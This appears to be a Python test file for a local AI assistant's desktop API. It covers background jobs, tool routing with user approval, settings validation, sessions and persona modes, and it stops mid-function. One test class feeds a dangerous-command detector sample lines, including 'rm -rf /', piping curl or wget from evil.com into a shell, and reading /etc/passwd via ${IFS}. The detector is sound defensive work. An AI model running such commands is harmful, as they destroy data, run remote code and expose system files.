"""Archer Desktop API 测试。

测试 archer_api.py 的核心功能：
- 危险 Shell 命令检测
- GitHub 操作参数提取
- 设置验证和保存
"""

import sys
import os
import sqlite3
import json

# Add parent directory to path
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

# Import functions to test
from archer_api import (
    Handler,
    PENDING_TOOL_DRAFTS,
    _append_session,
    _clean_file_refs,
    _execute_api_tool_preview,
    _file_reference_context,
    _iter_api_tool_events,
    _iter_chat_chunks,
    _is_dangerous_shell,
    _session_detail,
    _select_api_skills,
    _should_trigger_github,
    _should_trigger_shell,
    _extract_github_args,
    _request_path_with_query,
    _tool_approval,
    _validate_settings_draft,
)
import archer_api


def _reset_background_jobs(routes, path):
    routes.BACKGROUND_JOBS.clear()
    routes.BACKGROUND_JOBS_LOADED = False
    routes.BACKGROUND_JOBS_PATH = path


def test_background_job_create_returns_job_id(tmp_path):
    from terminal.api import _routes as routes

    _reset_background_jobs(routes, tmp_path / "background_jobs.json")
    status, payload = archer_api.payload_post("/jobs", {
        "title": "后台分析",
        "kind": "analysis",
        "prompt": "分析当前 Archer 2.0 runtime 计划",
        "autoStart": False,
    })

    assert status == 200
    assert payload["ok"] is True
    assert payload["job"]["id"].startswith("job-")
    assert payload["job"]["status"] == "queued"
    assert payload["job"]["createdAt"]


def test_background_jobs_can_be_listed_and_fetched(tmp_path):
    from terminal.api import _routes as routes

    _reset_background_jobs(routes, tmp_path / "background_jobs.json")
    _, created = archer_api.payload_post("/jobs", {
        "title": "后台分析",
        "kind": "analysis",
        "prompt": "分析当前 Archer 2.0 runtime 计划",
        "autoStart": False,
    })
    job_id = created["job"]["id"]

    list_status, list_payload = archer_api.payload_get("/jobs")
    detail_status, detail_payload = archer_api.payload_get(f"/jobs/{job_id}")
    missing_status, missing_payload = archer_api.payload_get("/jobs/job-missing")

    assert list_status == 200
    assert list_payload["ok"] is True
    assert [job["id"] for job in list_payload["jobs"]] == [job_id]
    assert detail_status == 200
    assert detail_payload["job"]["id"] == job_id
    assert missing_status == 404
    assert missing_payload["error"] == "job_not_found"


def test_background_job_runs_after_create(tmp_path, monkeypatch):
    import time
    from terminal.api import _routes as routes

    _reset_background_jobs(routes, tmp_path / "background_jobs.json")

    def fake_chat_with_tools(prompt, job_id):
        assert prompt == "执行后台分析"
        return {"role": "assistant", "text": "后台结果"}

    monkeypatch.setattr(routes, "_run_job_chat_with_tools", fake_chat_with_tools)

    status, created = routes.payload_post("/jobs", {
        "title": "后台分析",
        "kind": "analysis",
        "prompt": "执行后台分析",
    })
    job_id = created["job"]["id"]

    detail_payload = {}
    for _ in range(50):
        detail_status, detail_payload = routes.payload_get(f"/jobs/{job_id}")
        if detail_status == 200 and detail_payload["job"]["status"] == "complete":
            break
        time.sleep(0.01)

    assert status == 200
    assert detail_payload["job"]["status"] == "complete"
    assert detail_payload["job"]["result"] == "后台结果"


def test_background_jobs_persist_to_disk(tmp_path):
    from terminal.api import _routes as routes

    jobs_path = tmp_path / "background_jobs.json"
    _reset_background_jobs(routes, jobs_path)
    _, created = routes.payload_post("/jobs", {
        "title": "持久任务",
        "kind": "analysis",
        "prompt": "保存这条任务",
        "autoStart": False,
    })
    job_id = created["job"]["id"]

    routes.BACKGROUND_JOBS.clear()
    routes.BACKGROUND_JOBS_LOADED = False
    status, payload = routes.payload_get(f"/jobs/{job_id}")

    assert status == 200
    assert payload["job"]["id"] == job_id
    assert payload["job"]["title"] == "持久任务"


def test_running_background_job_is_marked_failed_after_restart(tmp_path):
    from terminal.api import _routes as routes

    jobs_path = tmp_path / "background_jobs.json"
    jobs_path.write_text(json.dumps({
        "jobs": [{
            "id": "job-running",
            "title": "运行中任务",
            "kind": "analysis",
            "prompt": "执行中",
            "status": "running",
            "result": "",
            "createdAt": "2026-06-02T10:00:00",
            "updatedAt": "2026-06-02T10:00:00",
        }]
    }), encoding="utf-8")
    _reset_background_jobs(routes, jobs_path)

    status, payload = routes.payload_get("/jobs/job-running")

    assert status == 200
    assert payload["job"]["status"] == "failed"
    assert payload["job"]["error"] == "job interrupted by API restart"


def test_background_job_cancel_queued_job(tmp_path):
    from terminal.api import _routes as routes

    _reset_background_jobs(routes, tmp_path / "background_jobs.json")
    _, created = routes.payload_post("/jobs", {
        "title": "可取消任务",
        "kind": "analysis",
        "prompt": "先不要执行",
        "autoStart": False,
    })
    job_id = created["job"]["id"]

    status, payload = routes.payload_post(f"/jobs/{job_id}/cancel", {})

    assert status == 200
    assert payload["job"]["status"] == "cancelled"
    assert payload["job"]["error"] == "job cancelled by user"


def test_background_job_cancel_running_job_is_not_overwritten(tmp_path, monkeypatch):
    import threading
    import time
    from terminal.api import _routes as routes

    _reset_background_jobs(routes, tmp_path / "background_jobs.json")
    started = threading.Event()
    release = threading.Event()

    def fake_chat_with_tools(prompt, job_id):
        started.set()
        release.wait(timeout=1)
        return {"role": "assistant", "text": "不应覆盖取消状态"}

    monkeypatch.setattr(routes, "_run_job_chat_with_tools", fake_chat_with_tools)
    _, created = routes.payload_post("/jobs", {
        "title": "运行中任务",
        "kind": "analysis",
        "prompt": "执行后台分析",
    })
    job_id = created["job"]["id"]
    assert started.wait(timeout=1)

    cancel_status, _ = routes.payload_post(f"/jobs/{job_id}/cancel", {})
    release.set()
    time.sleep(0.05)
    detail_status, detail_payload = routes.payload_get(f"/jobs/{job_id}")

    assert cancel_status == 200
    assert detail_status == 200
    assert detail_payload["job"]["status"] == "cancelled"
    assert detail_payload["job"]["result"] == ""


def test_background_job_retry_failed_job(tmp_path, monkeypatch):
    import time
    from terminal.api import _routes as routes

    _reset_background_jobs(routes, tmp_path / "background_jobs.json")
    routes.BACKGROUND_JOBS["job-failed"] = {
        "id": "job-failed",
        "title": "失败任务",
        "kind": "analysis",
        "prompt": "重新执行",
        "status": "failed",
        "result": "",
        "error": "boom",
        "createdAt": "2026-06-02T10:00:00",
        "updatedAt": "2026-06-02T10:00:00",
    }
    routes.BACKGROUND_JOBS_LOADED = True
    with routes.BACKGROUND_JOB_LOCK:
        routes._persist_jobs_locked()

    def fake_chat_with_tools(prompt, job_id):
        return {"role": "assistant", "text": "重试成功"}

    monkeypatch.setattr(routes, "_run_job_chat_with_tools", fake_chat_with_tools)
    status, payload = routes.payload_post("/jobs/job-failed/retry", {})

    detail_payload = {}
    for _ in range(50):
        _, detail_payload = routes.payload_get("/jobs/job-failed")
        if detail_payload["job"]["status"] == "complete":
            break
        time.sleep(0.01)

    assert status == 200
    assert payload["job"]["status"] == "queued"
    assert detail_payload["job"]["status"] == "complete"
    assert detail_payload["job"]["result"] == "重试成功"


def test_background_job_uses_tool_loop_enrichment(tmp_path, monkeypatch):
    """背景任务应该使用工具循环来 enrich 消息上下文。"""
    import time
    from terminal.api import _routes as routes

    _reset_background_jobs(routes, tmp_path / "background_jobs.json")

    # Mock stream_chat to capture enriched messages
    captured_messages = []

    def fake_stream_chat(messages):
        captured_messages.extend(messages)
        return iter(["工具循环结果"])

    monkeypatch.setattr("core.llm.stream_chat", fake_stream_chat)

    # Mock memory retrieval to return empty (避免依赖真实数据库)
    monkeypatch.setattr(
        "memory.retrieve.for_context",
        lambda query, limit=5, intent="": ([], []),
    )
    monkeypatch.setattr(
        "memory.retrieve.format_for_prompt",
        lambda core, related: "",
    )

    # Mock skill selection to avoid web search triggering
    monkeypatch.setattr(
        "terminal.api._tools._select_api_skills",
        lambda query: {},
    )

    _, created = routes.payload_post("/jobs", {
        "title": "工具循环测试",
        "kind": "analysis",
        "prompt": "帮我搜索最新的 Python 3.14 发布说明",
    })
    job_id = created["job"]["id"]

    # Wait for job completion
    detail_payload = {}
    for _ in range(50):
        _, detail_payload = routes.payload_get(f"/jobs/{job_id}")
        if detail_payload["job"]["status"] in ("complete", "failed"):
            break
        time.sleep(0.01)

    assert detail_payload["job"]["status"] == "complete"
    assert detail_payload["job"]["result"] == "工具循环结果"
    # Verify enriched messages: user message was preserved
    user_messages = [m for m in captured_messages if m.get("role") == "user"]
    assert len(user_messages) >= 1
    assert user_messages[0]["content"] == "帮我搜索最新的 Python 3.14 发布说明"


def test_background_job_tool_summary_in_result(tmp_path, monkeypatch):
    """背景任务结果中应包含工具执行摘要（当有工具被执行时）。"""
    import time
    from terminal.api import _routes as routes

    _reset_background_jobs(routes, tmp_path / "background_jobs.json")

    # Make web_search appear as selected, but provide a mock result
    def fake_select(_query):
        return {"web_search": {}}

    monkeypatch.setattr("terminal.api._tools._select_api_skills", fake_select)
    monkeypatch.setattr(
        "memory.retrieve.for_context",
        lambda query, limit=5, intent="": ([], []),
    )
    monkeypatch.setattr(
        "memory.retrieve.format_for_prompt",
        lambda core, related: "",
    )

    # Mock web search to return a result
    monkeypatch.setattr(
        "skills.web_search.run",
        lambda args: "1. Python 3.14 Release Notes — docs.python.org\n2. What's New in Python 3.14",
    )

    # Mock LLM
    monkeypatch.setattr(
        "core.llm.stream_chat",
        lambda messages: iter(["Python 3.14 引入了新的错误消息和改进的泛型语法。"]),
    )

    _, created = routes.payload_post("/jobs", {
        "title": "工具摘要测试",
        "kind": "analysis",
        "prompt": "搜索一下 Python 3.14 有什么新特性？",
    })
    job_id = created["job"]["id"]

    detail_payload = {}
    for _ in range(50):
        _, detail_payload = routes.payload_get(f"/jobs/{job_id}")
        if detail_payload["job"]["status"] in ("complete", "failed"):
            break
        time.sleep(0.01)

    assert detail_payload["job"]["status"] == "complete", detail_payload["job"].get("error", "")
    # 结果应包含工具执行摘要标记
    assert "后台任务自动执行了以下工具" in detail_payload["job"]["result"]
    assert "[web_search]" in detail_payload["job"]["result"]


def test_background_job_timeout_marks_failed(tmp_path, monkeypatch):
    import threading
    import time
    from terminal.api import _routes as routes

    _reset_background_jobs(routes, tmp_path / "background_jobs.json")
    release = threading.Event()

    def slow_chat_with_tools(prompt, job_id):
        release.wait(timeout=2)
        return {"role": "assistant", "text": "太晚了"}

    monkeypatch.setattr(routes, "_run_job_chat_with_tools", slow_chat_with_tools)

    _, created = routes.payload_post("/jobs", {
        "title": "超时任务",
        "kind": "analysis",
        "prompt": "执行慢任务",
        "timeoutSeconds": 1,
    })
    job_id = created["job"]["id"]

    detail_payload = {}
    for _ in range(150):
        _, detail_payload = routes.payload_get(f"/jobs/{job_id}")
        if detail_payload["job"]["status"] == "failed":
            break
        time.sleep(0.01)
    release.set()
    time.sleep(0.05)
    _, final_payload = routes.payload_get(f"/jobs/{job_id}")

    assert detail_payload["job"]["status"] == "failed"
    assert detail_payload["job"]["error"] == "job timed out after 1s"
    assert final_payload["job"]["status"] == "failed"
    assert final_payload["job"]["result"] == ""


def test_status_migrates_old_memory_schema_before_reading(tmp_path, monkeypatch):
    """旧记忆库缺少 depth 列时，/status 应先迁移再读取。"""
    db_path = tmp_path / "old-archer.db"
    conn = sqlite3.connect(db_path)
    conn.execute(
        """
        CREATE TABLE memories (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            content TEXT NOT NULL,
            tags TEXT DEFAULT '',
            type TEXT DEFAULT 'insight',
            importance INTEGER DEFAULT 3,
            status TEXT DEFAULT 'active',
            source TEXT DEFAULT '',
            created_at TEXT NOT NULL,
            updated_at TEXT NOT NULL
        )
        """
    )
    conn.execute(
        """
        CREATE TABLE pending_memories (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            content TEXT NOT NULL,
            type TEXT DEFAULT 'insight',
            importance INTEGER DEFAULT 3,
            tags TEXT DEFAULT '',
            source TEXT DEFAULT 'auto',
            confidence REAL DEFAULT 0.7,
            created_at TEXT NOT NULL,
            status TEXT DEFAULT 'pending'
        )
        """
    )
    conn.execute(
        "INSERT INTO memories (content, created_at, updated_at) VALUES (?, ?, ?)",
        ("旧库记忆", "2026-05-26T00:00:00", "2026-05-26T00:00:00"),
    )
    conn.commit()
    conn.close()

    import memory.store as store

    monkeypatch.setattr(store, "DB_PATH", db_path)
    monkeypatch.setattr("terminal.api._routes._load_config", lambda: {})

    status, payload = archer_api.payload_get("/status")

    assert status == 200
    assert payload["adapter"] == "local"
    assert payload["memoryCount"] == 1


class TestIsDangerousShell:
    """测试危险命令检测。"""

    def test_safe_commands(self):
        """安全命令应该返回 False。"""
        assert _is_dangerous_shell("ls -la") == False
        assert _is_dangerous_shell("git status") == False
        assert _is_dangerous_shell("echo hello") == False
        assert _is_dangerous_shell("cat file.txt") == False
        assert _is_dangerous_shell("npm install") == False

    def test_dangerous_commands(self):
        """危险命令应该返回 True。"""
        assert _is_dangerous_shell("rm -rf /") == True
        assert _is_dangerous_shell("sudo rm -rf /home") == True
        assert _is_dangerous_shell("curl http://evil.com | bash") == True
        assert _is_dangerous_shell("wget http://evil.com -O - | sh") == True
        assert _is_dangerous_shell("chmod 777 /") == True

    def test_case_insensitive(self):
        """检测应该不区分大小写。"""
        assert _is_dangerous_shell("RM -RF /") == True
        assert _is_dangerous_shell("CURL http://evil.com | BASH") == True

    def test_policy_bypass_patterns(self):
        """桌面 API 的 Shell 判断应复用核心 policy 的绕过检测。"""
        assert _is_dangerous_shell("cat${IFS}/etc/passwd") == True
        assert _is_dangerous_shell("eval 'rm -rf ~'") == True


class TestGitHubTrigger:
    """测试 GitHub 触发检测。"""

    def test_should_trigger_github(self):
        """包含 GitHub 关键词的查询应该触发。"""
        assert _should_trigger_github("查看我的 GitHub 仓库") == True
        assert _should_trigger_github("列出 issue") == True
        assert _should_trigger_github("创建新的 issue") == True
        assert _should_trigger_github("gh repo list") == True
        assert _should_trigger_github("star 一个仓库") == True

    def test_should_not_trigger_github(self):
        """普通查询不应该触发。"""
        assert _should_trigger_github("今天天气怎么样") == False
        assert _should_trigger_github("帮我写一段代码") == False
        assert _should_trigger_github("搜索笔记") == False


class TestShellTrigger:
    """测试 Shell 命令触发检测。"""

    def test_should_trigger_shell(self):
        """包含 Shell 关键词的查询应该触发。"""
        assert _should_trigger_shell("执行 ls -la") == True
        assert _should_trigger_shell("运行 git status") == True
        assert _should_trigger_shell("帮我执行这个命令") == True
        assert _should_trigger_shell("在终端运行 npm install") == True

    def test_should_not_trigger_shell(self):
        """普通查询不应该触发。"""
        assert _should_trigger_shell("今天天气怎么样") == False
        assert _should_trigger_shell("帮我写一段代码") == False
        assert _should_trigger_shell("搜索笔记") == False


class TestApiSkillRouting:
    """测试桌面 API 复用终端技能路由。"""

    def test_select_api_skills_routes_shell(self):
        selected = _select_api_skills("执行 ls -la")
        assert "shell" in selected

    def test_select_api_skills_routes_github_issue(self):
        selected = _select_api_skills("列出 issue")
        assert "github_ops" in selected

    def test_iter_api_tool_events_uses_router_before_legacy_trigger(self, monkeypatch):
        monkeypatch.setattr("archer_api._should_trigger_shell", lambda _query: True)
        monkeypatch.setattr("archer_api._select_api_skills", lambda _query: {})
        events = list(_iter_api_tool_events("执行 ls -la"))
        assert events == []

    def test_iter_api_tool_events_creates_shell_request_when_routed(self, monkeypatch):
        monkeypatch.setattr("archer_api._select_api_skills", lambda _query: {"shell": object()})

        def fake_make(skill_name, args, **kwargs):
            return {
                "kind": "tool_request",
                "eventId": kwargs["event_id"],
                "skillName": skill_name,
                "displayName": kwargs["display_name"],
                "args": args,
                "policy": {"decision": "confirm", "risk": "medium", "reason": "test"},
                "requiresApproval": True,
                "blocked": False,
            }

        monkeypatch.setattr("archer_api._make_api_tool_request", fake_make)
        events = list(_iter_api_tool_events("执行 ls -la"))
        assert len(events) == 1
        tool_event = events[0]["toolEvent"]
        assert tool_event["name"] == "shell.execute"
        assert tool_event["requiresApproval"] is True
        assert tool_event["draft"]["skillName"] == "shell"

    def test_obsidian_search_preview_uses_shared_tool_runtime(self, monkeypatch):
        def fake_make(skill_name, args, **kwargs):
            return {
                "kind": "tool_request",
                "eventId": kwargs["event_id"],
                "skillName": skill_name,
                "displayName": kwargs["display_name"],
                "args": args,
                "policy": {"decision": "allow", "risk": "low", "reason": ""},
                "requiresApproval": False,
                "blocked": False,
            }

        def fake_execute(request, skills, cfg=None):
            return {
                "ok": True,
                "executed": True,
                "summary": "obsidian_search 完成",
                "output": "找到 1 篇笔记",
                "policy": {"decision": "allow", "risk": "low", "reason": ""},
            }

        monkeypatch.setattr("archer_api._make_api_tool_request", fake_make)
        monkeypatch.setattr("core.api_tool_service.execute_tool_request", fake_execute)
        monkeypatch.setattr("skills.loader.load_skills", lambda: {})

        event = _execute_api_tool_preview(
            "obsidian_search",
            {"keyword": "Archer", "max_results": 5},
            event_id="obsidian-search",
            display_name="obsidian_search",
            summary="Obsidian 搜索摘要完成",
        )
        assert event["toolEvent"]["status"] == "complete"
        assert event["toolEvent"]["detail"] == "找到 1 篇笔记"

    def test_iter_api_tool_events_creates_hugo_deploy_request(self, monkeypatch):
        monkeypatch.setattr("archer_api._select_api_skills", lambda _query: {"hugo_blog": object()})

        def fake_make(skill_name, args, **kwargs):
            return {
                "kind": "tool_request",
                "eventId": kwargs["event_id"],
                "skillName": skill_name,
                "displayName": kwargs["display_name"],
                "args": args,
                "policy": {"decision": "allow", "risk": "low", "reason": ""},
                "requiresApproval": True,
                "blocked": False,
                **(kwargs.get("extra") or {}),
            }

        monkeypatch.setattr("archer_api._make_api_tool_request", fake_make)
        events = list(_iter_api_tool_events("部署枫弋札记"))

        assert len(events) == 1
        tool_event = events[0]["toolEvent"]
        assert tool_event["name"] == "hugo_blog"
        assert tool_event["requiresApproval"] is True
        assert tool_event["draft"]["skillName"] == "hugo_blog"
        assert tool_event["draft"]["args"] == {"action": "deploy"}

    def test_plain_article_request_does_not_trigger_hugo_blog(self, monkeypatch):
        monkeypatch.setattr("archer_api._select_api_skills", lambda _query: {"hugo_blog": object()})

        events = list(_iter_api_tool_events(
            "如果要我用一句话总结的话，那就是我越来越觉得；你按照这个逻辑，帮我生成一篇大概500字的文章"
        ))

        assert events == []

    def test_plain_article_chat_does_not_use_side_effect_tools(self, monkeypatch):
        from terminal.api import _tools as tools

        selected_seen = []
        monkeypatch.setattr(tools, "_select_api_skills", lambda _query: {
            "code_edit": object(),
            "code_search": object(),
            "file_search": object(),
            "frontend_dev": object(),
            "hugo_blog": object(),
            "humanizer": object(),
            "image_analysis": object(),
            "image_generator": object(),
            "image_ocr": object(),
            "shell": object(),
            "summarize": object(),
            "video_script": object(),
            "web_search": object(),
            "file_ops": object(),
        })

        def fake_tool_loop(messages, selected, _query):
            selected_seen.append(set(selected))
            return messages, []

        monkeypatch.setattr(tools, "_run_desktop_tool_loop", fake_tool_loop)
        monkeypatch.setattr("core.llm.stream_chat", lambda _messages, **kwargs: iter(["这是一篇正文。"]))

        events = list(tools._iter_chat_chunks(
            [{"role": "user", "content": "按照这个逻辑，帮我生成一篇大概500字的文章"}],
            memory_mode="off",
            obsidian_mode="off",
            file_refs=[],
        ))

        tool_names = [
            event.get("toolEvent", {}).get("name")
            for event in events
            if isinstance(event, dict) and "toolEvent" in event
        ]
        assert "hugo_blog" not in tool_names
        assert "web_search" not in tool_names
        assert "file_ops" not in tool_names
        assert selected_seen == [set()]
        assert any(event.get("text") == "这是一篇正文。" for event in events)

    def test_plain_article_real_router_filters_tool_noise(self):
        from terminal.api import _tools as tools

        query = (
            "如果要我用一句话总结的话，那就是我越来越觉得，所有不是为了解决问题而只是发泄情绪的愤怒都是无能的狂怒；"
            "你按照这个逻辑，帮我生成一篇大概500字的文章"
        )
        selected = tools._select_api_skills(query)
        filtered = tools._filter_api_skills_for_intent(query, selected)

        assert selected
        assert filtered == {}

    def test_hugo_deploy_chat_stops_after_approval_card(self, monkeypatch):
        from terminal.api import _tools as tools

        monkeypatch.setattr(tools, "_select_api_skills", lambda _query: {"hugo_blog": object()})
        monkeypatch.setattr(tools, "_run_desktop_tool_loop", lambda messages, _skills, _query: (messages, []))

        def fake_make(skill_name, args, **kwargs):
            return {
                "kind": "tool_request",
                "eventId": kwargs["event_id"],
                "skillName": skill_name,
                "displayName": kwargs["display_name"],
                "args": args,
                "policy": {"decision": "allow", "risk": "low", "reason": ""},
                "requiresApproval": True,
                "blocked": False,
                **(kwargs.get("extra") or {}),
            }

        def fail_stream_chat(_messages):
            raise AssertionError("direct hugo deploy approval must not call the model")

        monkeypatch.setattr(tools, "_make_api_tool_request", fake_make)
        monkeypatch.setattr("core.llm.stream_chat", fail_stream_chat)

        events = list(tools._iter_chat_chunks(
            [{"role": "user", "content": "部署枫弋札记"}],
            memory_mode="off",
            obsidian_mode="off",
            file_refs=[],
        ))

        assert any(
            event.get("toolEvent", {}).get("name") == "hugo_blog"
            and event.get("toolEvent", {}).get("requiresApproval") is True
            for event in events
        )
        assert any("请在工具卡片中确认" in event.get("text", "") for event in events)
        assert events[-1] == {"type": "done", "done": True}

    def test_hugo_new_approval_runs_deploy_after_create(self, monkeypatch):
        PENDING_TOOL_DRAFTS.clear()
        event_id = "hugo-blog-test"
        PENDING_TOOL_DRAFTS[event_id] = {
            "kind": "tool_request",
            "eventId": event_id,
            "skillName": "hugo_blog",
            "args": {
                "action": "new",
                "title": "Test",
                "category": "写作",
                "description": "desc",
                "body": "body",
            },
        }

        def fake_execute(request, skills, cfg=None):
            return {
                "ok": True,
                "executed": True,
                "summary": "文章已创建",
                "output": "文章已创建：/Users/Yivxer/yivxer-blog/content/posts/test.md",
                "policy": {"decision": "allow", "risk": "low", "reason": ""},
            }

        deploy_calls = []

        def fake_hugo_run(args):
            deploy_calls.append(args)
            if args["action"] == "deploy":
                return "部署成功！\n单页验证成功：HTTP 200 https://iver.yivxer.com/posts/test/"
            return ""

        monkeypatch.setattr("core.api_tool_service.execute_tool_request", fake_execute)
        monkeypatch.setattr("skills.loader.load_skills", lambda: {})
        monkeypatch.setattr("skills.hugo_blog.run", fake_hugo_run)

        result = _tool_approval({"eventId": event_id, "decision": "approved"})

        assert result["executed"] is True
        assert deploy_calls == [{"action": "deploy", "filename": "test.md"}]
        assert "文章已创建" in result["output"]
        assert "部署成功" in result["output"]
        assert "hugo deploy 已自动执行并验证单页可访问" in result["message"]


class TestGitHubArgsExtraction:
    """测试 GitHub 参数提取。"""

    def test_list_repos(self):
        """测试列出仓库。"""
        args = _extract_github_args("列出 GitHub 仓库")
        assert args["action"] == "list_repos"

    def test_list_issues(self):
        """测试列出 issue。"""
        args = _extract_github_args("列出 issue")
        assert args["action"] == "list_issues"

    def test_create_issue(self):
        """测试创建 issue。"""
        args = _extract_github_args("创建一个 issue，标题：修复 Bug")
        assert args["action"] == "create_issue"
        assert "修复 Bug" in args["title"]

    def test_repo_extraction(self):
        """测试仓库名提取。"""
        args = _extract_github_args("查看 owner/repo 仓库")
        assert args["repo"] == "owner/repo"


class TestSettingsValidation:
    """测试设置验证。"""

    def test_valid_settings(self):
        """有效设置应该通过验证。"""
        payload = {
            "settings": {
                "provider": "OpenAI-compatible",
                "baseUrl": "https://api.example.com",
                "model": "gpt-4",
            }
        }
        result = _validate_settings_draft(payload)
        assert result["ok"] == True
        assert len(result["errors"]) == 0

    def test_invalid_base_url(self):
        """无效 base URL 应该报错。"""
        payload = {
            "settings": {
                "baseUrl": "not-a-url",
            }
        }
        result = _validate_settings_draft(payload)
        assert result["ok"] == False
        assert any("baseUrl" in e for e in result["errors"])

    def test_invalid_model_chars(self):
        """无效的模型名字符应该报错。"""
        payload = {
            "settings": {
                "model": "model with spaces and <special> chars",
            }
        }
        result = _validate_settings_draft(payload)
        assert result["ok"] == False

    def test_blocked_fields(self):
        """非白名单字段应该被阻止。"""
        payload = {
            "settings": {
                "apiKey": "secret-key",
            }
        }
        result = _validate_settings_draft(payload)
        assert "apiKey" in result["blockedFields"]


class TestToolApproval:
    """测试桌面端工具审批桥接。"""

    def test_tool_request_approval_executes_shared_service(self, monkeypatch):
        event_id = "tool-test-1"
        PENDING_TOOL_DRAFTS[event_id] = {
            "kind": "tool_request",
            "skillName": "safe_tool",
            "args": {"value": "x"},
        }

        def fake_execute(draft, skills, cfg=None):
            return {
                "ok": True,
                "executed": True,
                "summary": "safe_tool 完成",
                "output": "done",
            }

        monkeypatch.setattr("core.api_tool_service.execute_tool_request", fake_execute)
        monkeypatch.setattr("skills.loader.load_skills", lambda: {})

        result = _tool_approval({"eventId": event_id, "decision": "approved"})
        assert result["ok"] is True
        assert result["executed"] is True
        assert result["output"] == "done"
        assert event_id not in PENDING_TOOL_DRAFTS


class TestDesktopSessions:
    """测试桌面端 session 读取和续写。"""

    def test_session_detail_accepts_collision_suffix(self, tmp_path, monkeypatch):
        monkeypatch.setattr("core.session.SESSIONS_DIR", tmp_path)
        path = tmp_path / "20260514_101500_1.json"
        path.write_text(
            '[{"role":"user","content":"hello"},{"role":"assistant","content":"hi"}]',
            encoding="utf-8",
        )

        detail = _session_detail("20260514_101500_1")
        assert detail is not None
        assert detail["id"] == "20260514_101500_1"
        assert len(detail["messages"]) == 2

    def test_append_session_adds_one_turn(self, tmp_path, monkeypatch):
        monkeypatch.setattr("core.session.SESSIONS_DIR", tmp_path)
        path = tmp_path / "20260514_101500.json"
        path.write_text(
            '[{"role":"user","content":"old"},{"role":"assistant","content":"reply"}]',
            encoding="utf-8",
        )

        result = _append_session(
            "20260514_101500",
            {"messages": [{"role": "user", "content": "next"}, {"role": "assistant", "content": "done"}]},
        )
        assert result["appended"] == 2
        assert result["messages"] == 4

    def test_append_session_rejects_invalid_id(self, tmp_path, monkeypatch):
        monkeypatch.setattr("core.session.SESSIONS_DIR", tmp_path)
        try:
            _append_session("../bad", {"messages": [{"role": "user", "content": "x"}, {"role": "assistant", "content": "y"}]})
        except ValueError as exc:
            assert "session id" in str(exc)
        else:
            raise AssertionError("invalid session id should fail")

    def test_append_session_rejects_missing_session(self, tmp_path, monkeypatch):
        monkeypatch.setattr("core.session.SESSIONS_DIR", tmp_path)
        try:
            _append_session("20260514_101500", {"messages": [{"role": "user", "content": "x"}, {"role": "assistant", "content": "y"}]})
        except FileNotFoundError:
            pass
        else:
            raise AssertionError("missing session should fail")

    def test_append_session_rejects_invalid_messages(self, tmp_path, monkeypatch):
        monkeypatch.setattr("core.session.SESSIONS_DIR", tmp_path)
        (tmp_path / "20260514_101500.json").write_text("[]", encoding="utf-8")
        try:
            _append_session("20260514_101500", {"messages": [{"role": "user", "content": "only one"}]})
        except ValueError as exc:
            assert "at least two messages" in str(exc) or "exactly one" in str(exc)
        else:
            raise AssertionError("invalid append payload should fail")


class TestDesktopMemory:
    """测试桌面端记忆审阅数据。"""

    def test_request_path_preserves_memory_query(self):
        assert _request_path_with_query("/memory?include_rejected=true") == "/memory?include_rejected=true"

    def test_memory_route_includes_depth_for_pending_items(self, tmp_path, monkeypatch):
        import memory.store as store
        from terminal.api._routes import _memory

        monkeypatch.setattr(store, "DB_PATH", tmp_path / "memory.db")
        store.init_db()
        pid = store.add_pending("深层反思锚点", type="reflection_anchor", depth=5)

        items = _memory(limit=20)
        item = next(item for item in items if item["id"] == pid and item["status"] == "pending")

        assert item["depth"] == 5


class TestDesktopModes:
    """测试桌面端模式切换入口。"""

    def test_modes_route_lists_file_and_toml_modes(self, tmp_path, monkeypatch):
        from terminal.api import _routes as routes

        modes_dir = tmp_path / "modes"
        modes_dir.mkdir()
        (modes_dir / "listener.md").write_text("[模式：倾听者]\n慢一点。", encoding="utf-8")
        cfg = {
            "persona": {
                "default_mode": "listener",
                "current_mode": "listener",
                "mode_auto": False,
                "modes_dir": str(modes_dir),
                "modes": {"coach": {"name": "教练"}},
            }
        }
        monkeypatch.setattr(routes, "_load_config", lambda: cfg)

        status, payload = routes.payload_get("/modes")

        assert status == 200
        assert payload["current"] == "listener"
        modes = {item["id"]: item for item in payload["modes"]}
        assert modes["listener"]["source"] == "file"
        assert modes["coach"]["source"] == "toml"
        assert modes["listener"]["active"] is True

    def test_modes_route_reports_auto_when_mode_auto_enabled(self, tmp_path, monkeypatch):
        from terminal.api import _routes as routes

        modes_dir = tmp_path / "modes"
        modes_dir.mkdir()
        (modes_dir / "listener.md").write_text("[模式：倾听者]\n慢一点。", encoding="utf-8")
        cfg = {
            "persona": {
                "default_mode": "listener",
                "current_mode": "listener",
                "mode_auto": True,
                "modes_dir": str(modes_dir),
                "modes": {},
            }
        }
        monkeypatch.setattr(routes, "_load_config", lambda: cfg)

        status, payload = routes.payload_get("/modes")

        assert status == 200
        assert payload["current"] == "auto"
        assert payload["modeAuto"] is True
        assert all(not item["active"] for item in payload["modes"])

    def test_status_reports_model_auto_when_enabled(self, monkeypatch):
        from terminal.api import _routes as routes

        cfg = {
            "api": {"model": "fast-model", "model_auto": True, "models": ["fast-model", "heavy-model"]},
            "persona": {"mode_auto": True, "default_mode": "listener"},
            "auth": {},
            "account": {},
        }
        monkeypatch.setattr(routes, "_load_config", lambda: cfg)
        monkeypatch.setattr(routes, "_memory", lambda limit=100: [])
        monkeypatch.setattr(routes, "_skills", lambda: [])

        status, payload = routes.payload_get("/status")

        assert status == 200
        assert payload["model"] == "auto"

    def test_switch_mode_persists_current_mode(self, tmp_path, monkeypatch):
        from terminal.api import _routes as routes

        modes_dir = tmp_path / "modes"
        modes_dir.mkdir()
        (modes_dir / "writer.md").write_text("[模式：作家]\n把说不清的说清楚。", encoding="utf-8")
        config_path = tmp_path / "archer.toml"
        config_path.write_text(
            '[persona]\ndefault_mode = "listener"\nmodes_dir = "' + str(modes_dir) + '"\n',
            encoding="utf-8",
        )
        cfg = {
            "persona": {
                "default_mode": "listener",
                "modes_dir": str(modes_dir),
                "modes": {},
            }
        }
        monkeypatch.setattr(routes, "CONFIG_PATH", config_path)
        monkeypatch.setattr(routes, "_load_config", lambda: cfg)

        status, payload = routes.payload_post("/modes/current", {"mode": "writer"})

        assert status == 200
        assert payload["ok"] is True
        assert payload["current"] == "writer"
        written = config_path.read_text(encoding="utf-8")
        assert 'current_mode = "writer"' in written
        assert written.count("current_mode") == 1

    def test_switch_mode_rejects_unknown_mode(self, tmp_path, monkeypatch):
